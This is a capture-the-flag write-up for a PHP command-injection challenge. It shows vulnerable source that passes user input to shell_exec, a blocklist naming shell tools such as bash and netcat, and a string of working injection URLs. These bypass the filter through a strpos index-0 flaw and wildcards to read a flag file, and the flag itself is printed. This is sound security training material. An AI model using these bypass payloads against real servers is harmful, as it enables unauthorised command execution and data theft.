# Command Injection 4
Web

## Challenge 

So many filters, I think it is enough to make NewWater!

http://challs.hats.sg:1340/

Flag format: flag{.+}

Challenge by: Gladiator

## Solution

Source

        $cmd = $_GET['cmd'];
        $forbidden = ['bash','brltty','bunzip2','busybox','bzcat','bzcmp','bzdiff','bzegrep','bzexe','bzfgrep','bzgrep','bzip2','bzip2recover','bzless','bzmore','cat','chacl','chgrp','chmod','chown','chvt','cp','cpio','dash','date','dd','df','dir','dmesg','dnsdomainname','domainname','dumpkeys','echo','ed','efibootdump','efibootmgr','egrep','false','fgconsole','fgrep','findmnt','find','fuser','fusermount','getfacl','grep','gunzip','gzexe','gzip','hciconfig','hostname','ip','journalctl','kbd_mode','kill','kmod','less','lessecho','lessfile','lesskey','lesspipe','ln','loadkeys','login','loginctl','lowntfs-3g','ls','lsblk','lsmod','mkdir','mknod','mktemp','more','mount','mountpoint','mt','mt-gnu','mv','nano','nc','nc.openbsd','netcat','netstat','networkctl','nisdomainname','ntfs-3g','ntfs-3g.probe','ntfscat','ntfscluster','ntfscmp','ntfsfallocate','ntfsfix','ntfsinfo','ntfsls','ntfsmove','ntfsrecover','ntfssecaudit','ntfstruncate','ntfsusermap','ntfswipe','open','openvt','pidof','ping','ping4','ping6','plymouth','prettyping','ps','pwd','rbash','readlink','red','rm','rmdir','rnano','run-parts','searchsploit','sed','setfacl','setfont','setupcon','sh','sh.distrib','sleep','ss','static-sh','stty','su','sync','systemctl','systemd','systemd-ask-password','systemd-escape','systemd-hwdb','systemd-inhibit','systemd-machine-id-setup','systemd-notify','systemd-sysusers','systemd-tmpfiles','systemd-tty-ask-password-agent','tar','tempfile','touch','true','udevadm','ulockmgr_server','umount','uname','uncompress','unicode_start','vdir','wdctl','which','whiptail','ypdomainname','zcat','zcmp','zdiff','zegrep','zfgrep','zforce','zgrep','zless','zmore','znew','!','@','#','$','%','^','&','(',')','+','=','{','}','[',']','\\','<','<<','>','>>','`','~','``','cat','less','more','head','tail','od','tac','hexdump','echo','touch','usr','>','<','>>','<<','$','bash','sh','sed','awk','etc','root','home','var','lib','flag','txt','a','f','l','g','secrets'];
        $output_forbidden = ['_'];
        foreach ($forbidden as $value) {
            
            if(strpos($cmd, $value)){
                echo "HACKER!";
                die();
            }
        }
        $output = shell_exec($cmd);
        foreach ($output_forbidden as $value) {            
            if(strpos($output, $value)){
                echo "HACKER!";
                die();
            }
        }
 
We see we can't use a lot of commands or even the characters 'a','f','l','g' (flag).

After going around, I noticed that strpos() will return 0 if the forbidden word is located at index 0. This bypasses the check.

Using ls, we find out there is a flag folder.

    Command: ls ../../../../../
    URL:     http://challs.hats.sg:1340/?cmd=ls%20../../../../../

    total 72
    drwxr-xr-x   1 root root 4096 Mar 27 01:09 bin
    drwxr-xr-x   2 root root 4096 Feb  3  2019 boot
    drwxr-xr-x   5 root root  340 Sep  9 09:43 dev
    drwxr-xr-x   1 root root 4096 Sep  7 06:33 etc
    drwxrwxr-x   1 root root 4096 Sep  6 18:42 flag
    drwxr-xr-x   2 root root 4096 Feb  3  2019 home
    //...


Using pwd command, we can we see that there is a folder called `/flag/secrets`.

    Command: pwd;cd /????/*;pwd
    URL:     http://challs.hats.sg:1340/?cmd=pwd;cd%20/????/*;pwd

    /var/www/html
    /flag/secrets

And here we find that the flag is at `/flag/secrets/flag.txt`.

    Command: ls;cd /????/*;ls -l
    URL:     http://challs.hats.sg:1340/?cmd=ls;cd%20/????/*;ls%20-l

    index.php
    total 4
    -rwxrwxr-x 1 root root 58 Sep  6 18:41 flag.txt

I tried all sorts to read it but to no avail. From the source code, the output is also filtered if it contains an underscore.

I thought of using the base64 tool, however, it contains the letter `a` which is forbidden. I decided to try to copy it out to the `tmp` folder.

We can list all the tools in /usr/bin/

    Command: ls /u*r/bin/b*
    URL:     http://challs.hats.sg:1340/?cmd=ls%20/u*r/bin/b*

    /usr/bin/b2sum
    /usr/bin/base32
    /usr/bin/base64
    /usr/bin/basename
    /usr/bin/bashbug


    Command: ls /u*r/bin/b*64
    URL:     http://challs.hats.sg:1340/?cmd=ls%20/u*r/bin/b*64
    /usr/bin/base64

Now, copy out the file to tmp folder.

    Command: cp  /u*r/bin/b*64  /tmp/b64
    URL:     http://challs.hats.sg:1340/?cmd=cp%20%20/u*r/bin/b*64%20/tmp/b64

Check that our file is there

    Command: ls /tmp/
    URL:     http://challs.hats.sg:1340/?cmd=ls%20/tmp/
    b64

Then we can use it.

    Command: /tmp/b64 /????/*/*.*
    URL:     http://challs.hats.sg:1340/?cmd=/tmp/b64%20/????/*/*.*
    ZmxhZ3tNQU1BQUFBQUFBQUFBQUFBQUFBQUFBQUFBQV9KdXN0X2tpbGxlZF9hX21hbm5ubm5ubm59Cg==

Base64 decode for the flag.

## Flag

	flag{MAMAAAAAAAAAAAAAAAAAAAAAAA_Just_killed_a_mannnnnnnn}
